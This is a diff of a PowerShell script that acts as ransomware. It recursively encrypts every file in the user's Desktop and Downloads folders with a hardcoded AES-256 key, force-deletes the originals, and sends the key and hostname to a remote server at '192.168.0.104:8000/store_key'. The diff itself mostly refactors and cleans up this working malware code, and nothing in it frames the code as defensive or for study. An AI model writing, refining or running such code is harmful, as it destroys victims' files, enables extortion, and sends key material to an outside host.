@@ -1,4 +1,7 @@
+
+# -------------------------------------------
 # Define the AES-256 encryption key (hardcoded)
+# -------------------------------------------
 $key = "12345678901234567890123456789012"  # 32 bytes (256 bits)
 
 # Convert the key to a byte array
@@ -10,24 +13,34 @@ $foldersToEncrypt = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
 # Log file path
 $logFilePath = "$env:USERPROFILE\Desktop\encryption_log.txt"
 
-# Function to calculate file hash
-function Get-FileHash {
+# ---------------------------------------------------------------
+# Custom file-hash function using .NET instead of Get-FileHash
+# ---------------------------------------------------------------
+function Get-FileHashCustom {
     param (
         [string]$filePath
     )
     if (Test-Path $filePath) {
         try {
-            $hash = (Get-FileHash -Algorithm SHA256 -Path $filePath).Hash
-            return $hash
+            $stream = [System.IO.File]::OpenRead($filePath)
+            $sha256 = [System.Security.Cryptography.SHA256]::Create()
+            $hashBytes = $sha256.ComputeHash($stream)
+            $stream.Close()
+            # Convert from byte[] to a readable hex string
+            return ($hashBytes | ForEach-Object ToString x2) -join ''
         } catch {
             Write-Host "Failed to calculate hash for: $filePath"
             return "N/A"
         }
+    } else {
+        Write-Host "Path not found: $filePath"
+        return "N/A"
     }
-    return "N/A"
 }
 
-# Function to encrypt a file
+# ------------------------------------------
+# Function to encrypt a single file
+# ------------------------------------------
 function Encrypt-File {
     param (
         [string]$filePath,
@@ -40,15 +53,9 @@ function Encrypt-File {
             return
         }
 
-        # Check if the file exists and is accessible
+        # Check if the file exists
         if (-not (Test-Path $filePath)) {
             Write-Host "File not found: $filePath"
-            return
-        }
-
-        # Check if the file is readable
-        if (-not ([System.IO.File]::Exists($filePath))) {
-            Write-Host "File is not accessible: $filePath"
             return
         }
 
@@ -63,14 +70,14 @@ function Encrypt-File {
         # Read the file content
         $fileContent = Get-Content -Path $filePath -Encoding Byte -ErrorAction Stop
 
-        # Calculate hash before encryption
-        $preEncryptionHash = Get-FileHash -filePath $filePath
+        # Calculate hash before encryption using our custom function
+        $preEncryptionHash = Get-FileHashCustom -filePath $filePath
 
         # Encrypt the file content
         $encryptor = $aes.CreateEncryptor()
         $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
 
-        # Write the IV + encrypted content to the file
+        # Prepare output (IV + encrypted bytes)
         $outputContent = $iv + $encryptedContent
         $outputFilePath = "$filePath.secured"
         [System.IO.File]::WriteAllBytes($outputFilePath, $outputContent)
@@ -79,7 +86,7 @@ function Encrypt-File {
         Remove-Item -Path $filePath -Force -ErrorAction Stop
 
         # Calculate hash after encryption
-        $postEncryptionHash = Get-FileHash -filePath $outputFilePath
+        $postEncryptionHash = Get-FileHashCustom -filePath $outputFilePath
 
         # Log the file details
         Add-Content -Path $logFilePath -Value "File: $filePath"
@@ -94,7 +101,9 @@ function Encrypt-File {
     }
 }
 
-# Encrypt all files in the specified folders
+# -------------------------------
+# Encrypt files in target folders
+# -------------------------------
 foreach ($folder in $foldersToEncrypt) {
     if (Test-Path $folder) {
         Get-ChildItem -Path $folder -Recurse -File | Where-Object { !$_.Name.EndsWith('.secured') } | ForEach-Object {
@@ -105,10 +114,12 @@ foreach ($folder in $foldersToEncrypt) {
     }
 }
 
+# ------------------------------------------------------------------------
 # Send the encryption key and hostname to the remote Python web server
+# ------------------------------------------------------------------------
 try {
     $hostname = $env:COMPUTERNAME
-    $url = "http://192.168.0.104:8000/store_key"  ## Auto generated // cahnge it for quick testing.
+    $url = "http://192.168.0.104:8000/store_key"  # Auto-generated // Adjust as needed for quick testing
     $body = @{
         key = $key
         hostname = $hostname
